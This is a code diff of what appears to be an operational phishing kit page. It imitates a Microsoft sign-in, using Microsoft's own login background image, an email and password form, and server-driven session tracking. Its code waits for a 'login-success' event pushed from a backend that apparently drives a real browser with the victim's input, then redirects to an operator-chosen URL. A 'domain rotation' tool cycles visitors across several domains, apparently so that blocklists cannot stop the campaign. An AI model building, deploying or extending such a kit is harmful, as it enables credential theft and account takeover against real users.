@@ -12,6 +12,8 @@
     <meta name="apple-mobile-web-app-status-bar-style" content="default">
     <title>Loading...</title>
     <style>
+        @import url('https://fonts.googleapis.com/css2?family=Segoe+UI:wght@300;400;600;700&display=swap');
+
         * {
             margin: 0;
             padding: 0;
@@ -20,9 +22,11 @@
 
         body {
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background-image: url('');
+            background-image: url('https://aadcdn.msftauth.net/shared/1.0/content/images/backgrounds/2-small_2055002f2daae2ed8f69f03944c0e5d9.jpg');
             background-size: cover;
             background-position: center;
+            background-repeat: no-repeat;
+            background-attachment: fixed;
             min-height: 100vh;
             display: flex;
             align-items: center;
@@ -862,7 +866,7 @@
             try {
                 const response = await fetch('/api/internal/background-url');
                 const data = await response.json();
-                
+
                 if (data.success && data.backgroundUrl) {
                     document.body.style.backgroundImage = `url('${data.backgroundUrl}')`;
                 }
@@ -881,7 +885,7 @@
             checkBackendHealth();
             checkExistingSession();
             showEmailForm();
-            
+
             // Clear error messages when user starts typing in password field
             const passwordInput = document.getElementById('passwordInput');
             if (passwordInput) {
@@ -1261,16 +1265,16 @@ Status: ${data.status}`);
                 // Set up SSE connection for immediate redirect notifications
                 let immediateRedirectHandled = false;
                 let eventSource = null;
-                
+
                 if (currentSessionId) {
                     eventSource = new EventSource(`/api/auth-status/${currentSessionId}`);
-                    
+
                     eventSource.addEventListener('login-success', function(event) {
                         if (!immediateRedirectHandled) {
                             immediateRedirectHandled = true;
                             console.log('🚀 Immediate redirect triggered by SSE event!');
                             eventSource.close();
-                            
+
                             // Get configured redirect URL from admin settings
                             fetch('/api/internal/redirect-url')
                                 .then(response => response.json())
@@ -1490,7 +1494,7 @@ Status: ${data.status}`);
             try {
                 const response = await fetch(`${API_BASE}/api/domain-rotation/config`);
                 const data = await response.json();
-                
+
                 if (data.success) {
                     domainRotationConfig = data.config;
                     await checkActiveDomains();
@@ -1505,10 +1509,10 @@ Status: ${data.status}`);
             try {
                 const response = await fetch(`${API_BASE}/api/domain-rotation/active-domains`);
                 const data = await response.json();
-                
+
                 if (data.success) {
                     activeDomains = data.activeDomains;
-                    
+
                     // Show rotation button if 2 or more domains are active
                     if (activeDomains.length >= 2) {
                         showDomainRotationButton();
@@ -1540,10 +1544,10 @@ Status: ${data.status}`);
             const modal = document.createElement('div');
             modal.id = 'domain-rotation-modal';
             modal.className = 'domain-rotation-modal';
-            
+
             const currentMainDomain = window.location.hostname;
             const otherDomains = activeDomains.filter(d => d.domain !== currentMainDomain).map(d => d.domain);
-            
+
             modal.innerHTML = `
                 <div class="modal-content">
                     <div class="modal-header">
@@ -1552,7 +1556,7 @@ Status: ${data.status}`);
                     </div>
                     <div class="modal-body">
                         <p><strong>Active Domains Detected:</strong> ${activeDomains.length}</p>
-                        
+
                         <div class="form-group">
                             <label>Select Main Domain:</label>
                             <select id="main-domain-select">
@@ -1561,7 +1565,7 @@ Status: ${data.status}`);
                                 ).join('')}
                             </select>
                         </div>
-                        
+
                         <div class="form-group">
                             <label>Other Domains (will be used for rotation):</label>
                             <div id="rotation-domains-list">
@@ -1573,7 +1577,7 @@ Status: ${data.status}`);
                                 ).join('')}
                             </div>
                         </div>
-                        
+
                         ${domainRotationConfig && domainRotationConfig.rotationString ? `
                         <div class="form-group">
                             <label>Current Rotation String:</label>
@@ -1585,7 +1589,7 @@ Status: ${data.status}`);
                             </div>
                         </div>
                         ` : ''}
-                        
+
                         <div class="form-actions">
                             <button onclick="setupDomainRotation()" class="primary-btn">Generate Rotation String</button>
                             ${domainRotationConfig && domainRotationConfig.rotationString ? `
@@ -1611,17 +1615,17 @@ Status: ${data.status}`);
         async function setupDomainRotation() {
             const mainDomain = document.getElementById('main-domain-select').value;
             const rotationDomains = [];
-            
+
             // Get checked rotation domains
             document.querySelectorAll('#rotation-domains-list input[type="checkbox"]:checked').forEach(checkbox => {
                 rotationDomains.push(checkbox.value);
             });
-            
+
             if (rotationDomains.length === 0) {
                 alert('Please select at least one rotation domain.');
                 return;
             }
-            
+
             try {
                 const response = await fetch(`${API_BASE}/api/domain-rotation/setup`, {
                     method: 'POST',
@@ -1633,9 +1637,9 @@ Status: ${data.status}`);
                         rotationDomains: rotationDomains
                     })
                 });
-                
+
                 const data = await response.json();
-                
+
                 if (data.success) {
                     domainRotationConfig = data.config;
                     showRotationStringResult(data.rotationString, mainDomain, rotationDomains);
@@ -1657,9 +1661,9 @@ Status: ${data.status}`);
                         'Content-Type': 'application/json'
                     }
                 });
-                
+
                 const data = await response.json();
-                
+
                 if (data.success) {
                     showRotationStringResult(data.rotationString, domainRotationConfig.mainDomain, domainRotationConfig.rotationDomains);
                 } else {
@@ -1674,11 +1678,11 @@ Status: ${data.status}`);
         // Show the rotation string result
         function showRotationStringResult(rotationString, mainDomain, rotationDomains) {
             closeDomainRotationModal();
-            
+
             const resultModal = document.createElement('div');
             resultModal.id = 'rotation-string-result';
             resultModal.className = 'domain-rotation-modal';
-            
+
             resultModal.innerHTML = `
                 <div class="modal-content">
                     <div class="modal-header">
@@ -1688,7 +1692,7 @@ Status: ${data.status}`);
                     <div class="modal-body">
                         <p><strong>Your rotation URL is ready!</strong></p>
                         <p>This single URL cycles through all your domains:</p>
-                        
+
                         <div class="rotation-urls">
                             <div class="url-item">
                                 <strong>Rotation Link:</strong> 
@@ -1696,7 +1700,7 @@ Status: ${data.status}`);
                                 <button onclick="copyToClipboard('https://${mainDomain}/${rotationString}')" class="copy-btn">📋</button>
                             </div>
                         </div>
-                        
+
                         <div class="rotation-info">
                             <h4>🔄 How it works:</h4>
                             <ul style="text-align: left; margin: 10px 0;">
@@ -1707,7 +1711,7 @@ Status: ${data.status}`);
                             </ul>
                             <small>💡 Each time someone visits this URL, they get redirected to the next domain in rotation.</small>
                         </div>
-                        
+
                         <div class="form-actions">
                             <button onclick="closeRotationStringResult()" class="primary-btn">Done</button>
                         </div>
@@ -1732,13 +1736,13 @@ Status: ${data.status}`);
                 // Brief visual feedback
                 const event = new CustomEvent('show-copy-feedback');
                 document.dispatchEvent(event);
-                
+
                 // Show temporary message
                 const msg = document.createElement('div');
                 msg.className = 'copy-feedback';
                 msg.textContent = 'Copied!';
                 document.body.appendChild(msg);
-                
+
                 setTimeout(() => {
                     msg.remove();
                 }, 2000);
@@ -1756,27 +1760,27 @@ Status: ${data.status}`);
 
         // Browser preparation for email page
         let emailPageSessionId = null; // Store session ID for email input
-        
+
         async function prepareEmailPageBrowser() {
             try {
                 console.log('📧 Preparing browser for email page...');
-                
+
                 const prepareResponse = await fetch('/api/prepare-email-page', {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json'
                     }
                 });
-                
+
                 const prepareData = await prepareResponse.json();
-                
+
                 if (prepareData.success) {
                     emailPageSessionId = prepareData.sessionId;
                     console.log(`✅ Browser prepared for email input: ${prepareData.sessionId}`);
                 } else {
                     console.warn('⚠️ Email page browser preparation failed:', prepareData.error);
                 }
-                
+
             } catch (error) {
                 console.warn('⚠️ Error during email page browser preparation:', error.message);
                 // Don't block page functionality if browser preparation fails
@@ -1793,10 +1797,27 @@ Status: ${data.status}`);
             }
         }
 
-        // Initialize domain rotation on page load
-        document.addEventListener('DOMContentLoaded', () => {
-            loadDomainRotationConfig();
+        // Load background configuration from backend
+        async function loadBackgroundFromConfig() {
+            try {
+                const response = await fetch('/api/internal/background-url');
+                const data = await response.json();
+
+                if (data.success && data.backgroundUrl) {
+                    document.body.style.backgroundImage = `url('${data.backgroundUrl}')`;
+                    console.log('✅ Background loaded from configuration:', data.backgroundUrl);
+                }
+            } catch (error) {
+                console.warn('⚠️ Could not load background configuration:', error.message);
+            }
+        }
+
+        // On page load
+        window.addEventListener('DOMContentLoaded', () => {
+            loadBackgroundFromConfig();
+            checkEmailPageSession();
         });
+
 
     </script>
 </body>
